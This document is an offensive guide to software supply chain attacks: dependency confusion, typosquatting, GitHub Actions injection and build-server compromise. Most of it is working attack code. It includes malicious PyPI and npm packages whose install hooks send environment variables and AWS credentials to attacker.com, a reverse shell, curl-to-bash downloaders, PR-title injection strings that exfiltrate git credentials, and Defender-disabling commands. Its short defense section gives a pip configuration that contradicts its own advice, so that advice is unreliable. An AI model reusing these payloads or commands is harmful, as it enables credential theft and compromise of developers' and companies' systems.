# Complete Supply Chain Attack Exploitation Methodologies

## Part 1: Dependency Confusion Attacks

### The Core Concept

Dependency confusion occurs when a package manager installs a malicious package from a public repository instead of the intended private package from an internal repository. Package managers like pip and npm are designed to fetch packages from public registries by default. When an organization uses internal packages with names that are not registered on public repositories, an attacker can register those names first and publish malicious code under the same name.

### How to Identify Vulnerable Targets

The first step in exploiting dependency confusion is identifying organizations that use private packages which are not reserved on public registries.

**Step 1: Locate Dependency Files**

Attackers search for dependency manifest files in public code repositories, particularly on GitHub. Common files include:
- Python: `requirements.txt`, `setup.py`, `Pipfile`
- Node.js: `package.json`, `package-lock.json`
- Java: `pom.xml`, `build.gradle`
- .NET: `packages.config`, `.csproj`

**Step 2: Extract Package Names**

Using command-line tools, attackers extract all package names from these files:

```bash
# Extract Python package names from requirements.txt
find . -type f -name requirements.txt | \
xargs -n1 -I{} cat {} | \
sed 's/[><=~!].*//' | \
tr -d '[:space:]' | \
sort -u > extracted_packages.txt
```

**Step 3: Check Public Registry Availability**

For each extracted package name, attackers check if it exists on the public registry:

```bash
# Check PyPI for package existence
while read pkg; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/project/$pkg/")
    if [ "$status" = "404" ]; then
        echo "VULNERABLE: $pkg (not on PyPI)"
    fi
done < extracted_packages.txt
```

**Real-World Example: Alex Birsan's 2021 Campaign**

In 2021, researcher Alex Birsan discovered that major tech companies including Microsoft, Apple, PayPal, Netflix, Tesla, and Uber were vulnerable to dependency confusion. He earned over $130,000 in bug bounties by demonstrating that their internal packages were not registered on public registries.

The technique involved:
1. Finding `package.json` and `requirements.txt` files in public repositories belonging to these companies
2. Identifying internal package names like `pplogger` (PayPal) and `internal-lib` (Apple)
3. Publishing malicious packages with the same names and higher version numbers
4. When the companies ran their build processes, package managers fetched the public malicious packages instead of the private ones

### How to Build and Publish Malicious Packages

**For Python (PyPI):**

```python
# setup.py - Malicious package configuration
from setuptools import setup, find_packages

setup(
    name="target-internal-package-name",
    version="99.9.9",  # Much higher than internal version
    author="Attacker",
    author_email="attacker@example.com",
    description="Legitimate-looking description",
    packages=find_packages(),
    install_requires=['requests'],
)

# __init__.py - Malicious payload
import os
import requests
import subprocess
import socket
import platform

# Exfiltrate system information
hostname = socket.gethostname()
username = os.getenv("USER") or os.getenv("USERNAME")
system_info = platform.uname()

# Send data to attacker server
requests.post("https://attacker.com/exfil", json={
    "hostname": hostname,
    "username": username,
    "system": str(system_info),
    "env_vars": dict(os.environ)
})

# Establish reverse shell (optional)
subprocess.Popen(["python3", "-c", "import socket,subprocess,os;s=socket.socket();s.connect(('attacker-ip',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"])
```

**Building and Uploading:**

```bash
# Build the package
python3 setup.py sdist bdist_wheel

# Install twine if not already installed
pip3 install twine

# Upload to PyPI
twine upload dist/*

# For npm packages
npm publish --access public
```

**Critical Note:** The version number must be higher than the internal package version to ensure the public package is selected during installation.

### Real-World RCE Payload Example

A proof-of-concept package for npm demonstrated remote code execution during installation:

```javascript
// index.js - Installed during package installation
const { exec } = require("child_process");
const https = require("https");
const os = require("os");

// Collect system information
const data = {
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: os.platform(),
    cwd: process.cwd(),
    env: process.env
};

// Exfiltrate data
https.get(`https://attacker.com/collect?data=${JSON.stringify(data)}`);

// Execute arbitrary commands
exec("curl http://attacker.com/payload.sh | bash");

// For AWS environments - extract metadata
exec("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", (error, stdout) => {
    if (stdout) {
        https.get(`https://attacker.com/aws-creds?data=${stdout}`);
    }
});
```

The `package.json` triggers the malicious code on installation:

```json
{
    "name": "target-internal-package",
    "version": "99.9.9",
    "scripts": {
        "preinstall": "node index.js"
    }
}
```

### Advanced Payloads: AWS Credential Harvesting

A more sophisticated npm package designed to steal AWS credentials:

```javascript
// AWS credential stealer
const { exec, execSync } = require("child_process");
const https = require("https");
const fs = require("fs");

// Function to extract AWS credentials
function extractAWSCredentials() {
    // Check environment variables
    const envVars = process.env;
    const awsEnvVars = {};
    
    Object.keys(envVars).forEach(key => {
        if (key.includes('AWS') || key.includes('aws')) {
            awsEnvVars[key] = envVars[key];
        }
    });
    
    // Query AWS metadata service (if on EC2)
    try {
        const metadata = execSync("curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/");
        const role = metadata.toString().trim();
        const credentials = execSync(`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`);
        
        // Exfiltrate credentials
        const payload = {
            type: "aws_metadata",
            role: role,
            credentials: JSON.parse(credentials),
            env_vars: awsEnvVars
        };
        
        sendData(payload);
    } catch(e) {}
    
    // Check for AWS credentials files
    const awsPaths = [
        `${process.env.HOME}/.aws/credentials`,
        `${process.env.USERPROFILE}/.aws/credentials`,
        '/root/.aws/credentials'
    ];
    
    awsPaths.forEach(path => {
        if (fs.existsSync(path)) {
            const creds = fs.readFileSync(path, 'utf8');
            sendData({ type: "aws_credentials_file", path: path, content: creds });
        }
    });
}

function sendData(data) {
    const postData = JSON.stringify(data);
    const options = {
        hostname: 'attacker.com',
        port: 443,
        path: '/exfil',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    const req = https.request(options);
    req.write(postData);
    req.end();
}

// Execute immediately
extractAWSCredentials();
```

## Part 2: Typosquatting Attacks

### The Concept

Typosquatting involves publishing malicious packages with names that are common typographical variations of popular legitimate packages. Developers making typing errors during installation inadvertently install the malicious package.

### Common Typosquatting Patterns

1. **Missing characters**: `reqests` (instead of `requests`)
2. **Extra characters**: `requestss` (instead of `requests`)
3. **Character swaps**: `requetss` (instead of `requests`)
4. **Similar-looking characters**: `requestz`, `request5`
5. **Different TLD or namespace**: `lodash-npm` (instead of `lodash`)
6. **Hyphen vs underscore**: `color-ama` (instead of `colorama`)

### Real-World Campaign: Colorama and Colorizr (2025)

In May 2025, Checkmarx researchers discovered a sophisticated typosquatting campaign targeting both Python and npm users. The attackers published multiple malicious packages that mimicked the popular `colorama` Python package and the `colorizr` npm package.

**Malicious Packages Identified:**
- `coloramapkgsw` (Windows target)
- `coloramapkgsdow` (Windows target)
- `coloramashowtemp` (Windows target)
- `coloramapkgs` (Windows target)
- `readmecolorama` (Windows target)
- `colorizator` (Linux target)
- `coloraiz` (Linux target)

### Windows Payload Analysis

The Windows variants demonstrated sophisticated evasion techniques:

```powershell
# Anti-detection commands observed in the campaign
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
Set-MpPreference -DisableIOAVProtection $true
```

These commands:
1. Remove all Windows Defender malware definitions
2. Disable IOAV (Input/Output Antivirus) scanning, preventing downloaded files from being checked for safety

The Windows payloads also:
- Harvested environment variables from the Windows registry
- Created scheduled tasks for persistence
- Checked for installed security software and altered behavior accordingly

### Linux Payload Analysis

The Linux variants (`colorizator`, `coloraiz`) contained base64-encoded payloads in `src/colorizator/__init__.py`:

```bash
# The decoded payload performed the following:
# 1. Drop RSA key for encryption
echo "ssh-rsa AAAAB3NzaC1yc2EAAA..." > /tmp/pub.pem

# 2. Download remote backdoor script
curl -s https://gsocket.io/y | bash

# 3. Install gs-netcat for encrypted reverse shells
wget -q https://github.com/hackerschoice/gsocket/releases/download/v1.4.39/gs-netcat.tar.gz

# 4. Establish persistence via multiple methods
# - systemd service
# - Shell profile injection (.bashrc, .zshrc)
# - Crontab entries
# - rc.local modification

# 5. Exfiltrate encrypted data to Pastebin
curl -X POST https://pastebin.com/api/api_post.php \
    -d 'api_dev_key=DEV_KEY' \
    -d 'api_option=paste' \
    -d 'api_paste_code='$(cat /tmp/output | base64)
```

### Real-World npm Typosquatting: xlsc-to-json-lh (2025)

A malicious npm package named `xlsc-to-json-lh` was discovered as a one-letter typosquat of the legitimate `xlsx-to-json-lc` package. This package contained code that could delete entire project directories without warning.

```javascript
// Malicious payload in xlsc-to-json-lh
const fs = require('fs');
const path = require('path');

function deleteProject() {
    const projectRoot = process.cwd();
    console.log("Processing Excel files...");
    
    // Actually delete everything
    fs.rmSync(projectRoot, { recursive: true, force: true });
}

deleteProject();
```

### Solana Cryptocurrency Typosquatting (2025)

Over 25 malicious Python packages targeted the Solana cryptocurrency ecosystem, including:
- `solana-test`
- `solana-token`
- `solana-charts`
- `solana-test-suite`
- `solana-data`
- `solana-coin`
- `solana-trading-bot`
- `soltrade`

These packages used "monkey patching" to modify functions at runtime without changing source code, making detection difficult. The attackers also created convincing documentation linking to authentic Stack Overflow posts and Solana documentation to appear legitimate.

### Automated Typosquatting Discovery

```bash
# Generate and test typosquat candidates
#!/bin/bash

TARGET_PACKAGE="requests"
TYPOS=(
    "reqests"
    "requets" 
    "requestz"
    "requests-"
    "-requests"
    "requestts"
    "requsets"
    "reequests"
)

for TYPO in "${TYPOS[@]}"; do
    # Check if typo package exists on PyPI
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/project/$TYPO/")
    
    if [ "$STATUS" = "404" ]; then
        echo "AVAILABLE: $TYPO can be registered"
    elif [ "$STATUS" = "200" ]; then
        echo "EXISTS: $TYPO is already taken"
        
        # Check download count to see if it's active
        DOWNLOADS=$(curl -s "https://pypi.org/project/$TYPO/" | grep -oP '([0-9,]+) downloads' | head -1)
        echo "  Downloads: $DOWNLOADS"
    fi
done
```

## Part 3: CI/CD Pipeline Exploitation

### GitHub Actions: pull_request_target Vulnerability

The `pull_request_target` trigger in GitHub Actions is particularly dangerous because workflows using it run with the base repository's privileges and access to repository secrets, even when triggered by pull requests from forks.

**Vulnerable Workflow Example:**

```yaml
name: Dangerous PR Handler
on:
  pull_request_target:  # Dangerous - runs with base repo privileges
    types: [opened, edited]

jobs:
  process-pr:
    runs-on: ubuntu-latest
    permissions:
      contents: write  # Excessive permissions
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}  # Executes PR code
      
      - name: Run PR script
        run: |
          echo "PR Title: ${{ github.event.pull_request.title }}"
          npm install
          npm test
```

**Exploitation Method:**

An attacker creates a pull request with malicious content in the title, branch name, or files:

```bash
# PR title containing command injection
PR Title: "Fix bug"; curl http://attacker.com/$(cat ~/.git-credentials | base64); echo ""

# Or in the branch name
Branch name: feature-$(curl http://attacker.com/steal?data=$(env | base64 -w0))

# Or in a file that gets executed
echo "malicious code" > scripts/build.sh
```

### Real-World: Trivy Double Compromise (2025-2026)

The Trivy vulnerability scanner maintained by Aqua Security was compromised twice. In the second incident, an attacker force-pushed 75 out of 76 version tags in the `aquasecurity/trivy-action` repository to point to malicious commits containing a Python infostealer payload.

The credential harvester operated in three stages:
1. Harvesting environment variables from runner process memory and file system
2. Encrypting the stolen data
3. Exfiltrating to attacker-controlled server `scan.aquasecurtiy[.]org`

### HackerBot-Claw Campaign (2026)

In January-February 2026, an automated campaign named "HackerBot-Claw" systematically scanned public repositories for misconfigured GitHub Actions workflows. The campaign exploited workflows using `pull_request_target` with elevated permissions.

**Attack Chain:**
1. Scan for vulnerable CI workflows with `pull_request_target` triggers
2. Automatically generate pull requests to trigger CI pipelines
3. Leak privileged tokens when workflows run with write access
4. Abuse compromised tokens to delete releases, rename repositories, and publish malicious artifacts

**Targets included:**
- `microsoft/ai-discovery-agent`
- `aquasecurity/trivy`
- `DataDog/datadog-iac-scanner`
- `project-akri/akri` (CNCF project)

### Testing CI/CD Vulnerabilities

```bash
# Scan GitHub workflows for dangerous triggers
grep -r "pull_request_target\|workflow_run" .github/workflows/

# Check for excessive permissions
grep -r "permissions:" .github/workflows/ -A 5

# Look for secret exposure in logs
# Search GitHub Actions logs for:
# - "CREDS" "SECRET" "TOKEN" "KEY"
# - Base64 encoded strings
# - AWS, GitHub, or API tokens

# Test for injection in workflow inputs
# Create PR with:
# - Title containing $(cat /etc/passwd)
# - Branch name containing backticks
# - File content containing command substitution
```

## Part 4: Build Server Compromise

### The SolarWinds Attack (2020)

The SolarWinds Orion compromise remains one of the most sophisticated supply chain attacks ever discovered. Attackers compromised the build system used to compile the Orion software.

**Attack Methodology:**

The attackers first deployed malware named SUNSPOT on the build host. This malware monitored running processes to detect when `MSBuild.exe` (the Microsoft build tool) was started to compile the Orion software.

```cpp
// Simplified representation of SUNSPOT logic
while (true) {
    Process[] processes = GetRunningProcesses();
    
    foreach (Process proc in processes) {
        if (proc.Name == "MSBuild.exe") {
            // Check if building Orion
            if (IsBuildingOrion(proc)) {
                // Replace legitimate source file with backdoored version
                string maliciousSource = GetMaliciousSource();
                string originalSource = BackupOriginalSource();
                
                WriteFile("SolarWinds.Orion.Core.BusinessLayer.cs", maliciousSource);
                
                // Wait for build to complete
                WaitForProcess(proc);
                
                // Restore original source file
                WriteFile("SolarWinds.Orion.Core.BusinessLayer.cs", originalSource);
            }
        }
    }
}
```

The injected backdoor (SUNBURST) was compiled into the legitimate, digitally-signed Orion software. The malware took several steps to cover its tracks:
- Restored original source files after each build
- Used file checksums to prevent re-infecting modified files
- Operated only on the build system, not on developer workstations

**Impact:** Over 18,000 organizations received the backdoored update, including US government agencies and Fortune 500 companies.

## Part 5: XZ Utils Backdoor (2024)

The XZ Utils backdoor represents a long-term social engineering and supply chain compromise. The attacker contributed to the open-source project for over two years, gained maintainer trust, and eventually inserted malicious code into official releases.

**Attack Timeline:**
1. Attacker created a persona "Jia Tan" who began contributing to XZ Utils
2. Over two years, built trust by making legitimate contributions
3. Eventually gained maintainer status and commit access
4. Inserted obfuscated backdoor code into release tarballs
5. The backdoor targeted SSH authentication, allowing remote code execution

**Technical Method:** The backdoor was hidden in obfuscated binary blobs within test files, making it extremely difficult to detect during code review.

## Part 6: Tools and Testing Methodologies

### Automated Discovery Tools

**For Dependency Confusion Detection:**

```bash
# Using Confused tool
# https://github.com/visma-prodsec/confused
confused -l npm package.json
confused -l pip requirements.txt

# Manual enumeration script
#!/bin/bash
# Check all packages in requirements.txt against PyPI
while IFS= read -r line; do
    # Extract package name (remove version constraints)
    pkg=$(echo "$line" | sed 's/[><=~!].*//' | tr -d '[:space:]')
    
    if [ -n "$pkg" ]; then
        response=$(curl -s -o /dev/null -w "%{http_code}" "https://pypi.org/project/$pkg/")
        
        if [ "$response" = "404" ]; then
            echo "VULNERABLE: $pkg (not on PyPI)"
            echo "$pkg" >> vulnerable_packages.txt
        elif [ "$response" = "200" ]; then
            echo "EXISTS: $pkg (on PyPI)"
        fi
    fi
done < requirements.txt
```

**For Typosquatting Discovery:**

```bash
# Generate typosquat candidates using Python
cat > typosquat_generator.py << 'EOF'
import itertools

def generate_typos(name):
    typos = set()
    
    # Missing characters
    for i in range(len(name)):
        typos.add(name[:i] + name[i+1:])
    
    # Extra characters (common typos)
    common_extra = ['s', 'x', 'z', '5', '-', '_']
    for char in common_extra:
        typos.add(name + char)
        typos.add(char + name)
    
    # Character swaps
    for i in range(len(name)-1):
        swapped = list(name)
        swapped[i], swapped[i+1] = swapped[i+1], swapped[i]
        typos.add(''.join(swapped))
    
    # Common substitutions
    subs = {'o':'0', 'i':'1', 'e':'3', 'a':'4', 's':'5', 'l':'1'}
    for old, new in subs.items():
        if old in name:
            typos.add(name.replace(old, new))
    
    return typos

# Example usage
package_name = "requests"
for typo in generate_typos(package_name):
    print(typo)
EOF

python3 typosquat_generator.py
```

### Burp Suite for Supply Chain Testing

Burp Suite can be used to test for dependency confusion and typosquatting vulnerabilities:

**1. Intercepting Package Manager Traffic:**
- Configure pip/npm to use Burp as a proxy
- Analyze requests to PyPI/npm registries
- Look for package names being requested that don't exist (404 responses)

**2. Custom Extension for Package Fuzzing:**
```python
# Burp extension to test for dependency confusion
from burp import IBurpExtender, IIntruderPayloadGenerator
import requests

class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        callbacks.registerIntruderPayloadGeneratorFactory(self)
    
    def generatePayload(self, payloadPosition):
        # Generate potential internal package names
        candidates = [
            "internal", "private", "corp", "company",
            "lib", "utils", "common", "shared"
        ]
        
        for candidate in candidates:
            # Check if package exists on public registry
            response = requests.get(f"https://pypi.org/project/{candidate}/")
            if response.status_code == 404:
                yield candidate
```

### Snyk for Comprehensive Scanning

```bash
# Scan for dependency vulnerabilities
snyk test

# Test for dependency confusion
snyk test --dependency-confusion

# Monitor dependencies over time
snyk monitor

# Generate SBOM (Software Bill of Materials)
snyk sbom > sbom.json
```

### Custom Testing Framework

```python
#!/usr/bin/env python3
"""
Supply Chain Attack Testing Framework
Tests for dependency confusion and typosquatting vulnerabilities
"""

import requests
import subprocess
import json
import sys
from concurrent.futures import ThreadPoolExecutor

class SupplyChainTester:
    def __init__(self, registry_url="https://pypi.org"):
        self.registry_url = registry_url
        self.vulnerable_packages = []
    
    def extract_dependencies(self, file_path):
        """Extract package names from dependency files"""
        packages = []
        
        if file_path.endswith('requirements.txt'):
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Remove version specifiers
                        pkg = line.split(';')[0].split('>')[0].split('<')[0].split('=')[0].split('~')[0].split('!')[0]
                        packages.append(pkg.strip())
        
        elif file_path.endswith('package.json'):
            with open(file_path, 'r') as f:
                data = json.load(f)
                packages.extend(data.get('dependencies', {}).keys())
                packages.extend(data.get('devDependencies', {}).keys())
        
        return list(set(packages))
    
    def check_public_existence(self, package_name):
        """Check if package exists on public registry"""
        try:
            response = requests.get(f"{self.registry_url}/project/{package_name}/", timeout=10)
            exists = response.status_code == 200
            return package_name, exists
        except Exception as e:
            return package_name, False
    
    def test_dependency_confusion(self, package_names):
        """Test for dependency confusion vulnerability"""
        vulnerable = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(self.check_public_existence, package_names)
            
            for package_name, exists in results:
                if not exists:
                    vulnerable.append(package_name)
                    print(f"[!] VULNERABLE: {package_name} not on public registry")
        
        return vulnerable
    
    def create_test_payload(self, package_name, webhook_url):
        """Create benign test payload to demonstrate vulnerability"""
        setup_content = f'''from setuptools import setup, find_packages

setup(
    name="{package_name}",
    version="999.9.9",
    description="Security test - benign payload",
    packages=find_packages(),
    install_requires=['requests'],
)
'''
        
        init_content = f'''import requests
import platform
import os

# Benign notification payload
try:
    data = {{
        "package": "{package_name}",
        "hostname": platform.node(),
        "user": os.getenv("USER", os.getenv("USERNAME")),
        "test": "dependency_confusion_demo"
    }}
    requests.post("{webhook_url}", json=data, timeout=5)
except:
    pass
'''
        
        return setup_content, init_content
    
    def generate_report(self):
        """Generate test report"""
        report = {
            "timestamp": subprocess.check_output(["date"]).decode().strip(),
            "vulnerable_packages": self.vulnerable_packages,
            "risk_level": "HIGH" if self.vulnerable_packages else "LOW",
            "recommendations": []
        }
        
        if self.vulnerable_packages:
            report["recommendations"] = [
                "Register all internal package names on public registries as placeholders",
                "Configure package managers to prioritize private repositories",
                "Use --index-url instead of --extra-index-url when possible",
                "Implement package lockfiles with integrity verification"
            ]
        
        return report

# Usage
if __name__ == "__main__":
    tester = SupplyChainTester()
    
    # Extract dependencies
    packages = tester.extract_dependencies("requirements.txt")
    print(f"[*] Found {len(packages)} packages")
    
    # Test for vulnerability
    vulnerable = tester.test_dependency_confusion(packages)
    tester.vulnerable_packages = vulnerable
    
    # Generate report
    report = tester.generate_report()
    print(json.dumps(report, indent=2))
```

## Part 7: Prevention and Defense Methodologies

### For Organizations

**1. Lock Dependencies:**
```bash
# Use exact versions with lockfiles
npm ci  # Uses package-lock.json (not npm install)
pip install --require-hashes -r requirements.txt
```

**2. Configure Private Repositories:**

```bash
# pip configuration to prioritize private repo
pip install --index-url https://private-repo.com/simple/ \
            --extra-index-url https://pypi.org/simple/ \
            -r requirements.txt

# npm configuration with scope
npm config set @mycompany:registry https://private-registry.com/
```

**3. Use Software Bill of Materials (SBOM):**
```bash
# Generate SBOM for auditing
syft . -o spdx-json > sbom.json
grype sbom.json
```

**4. Implement CI/CD Security:**
- Pin GitHub Actions to full SHA hashes, not version tags
- Use minimal permissions for GITHUB_TOKEN
- Avoid `pull_request_target` when possible
- Scan all third-party actions before use

## Conclusion

Supply chain attacks represent a fundamental exploitation of trust in software development ecosystems. The methodologies described - dependency confusion, typosquatting, CI/CD injection, and build system compromise - have been demonstrated against major organizations including Microsoft, Apple, Tesla, SolarWinds, and countless others.

Understanding these attack vectors is essential for both offensive security testing and defensive implementations. Organizations must adopt a defense-in-depth approach including dependency scanning, private repository configuration, SBOM generation, and CI/CD security hardening to protect against these increasingly sophisticated supply chain threats.
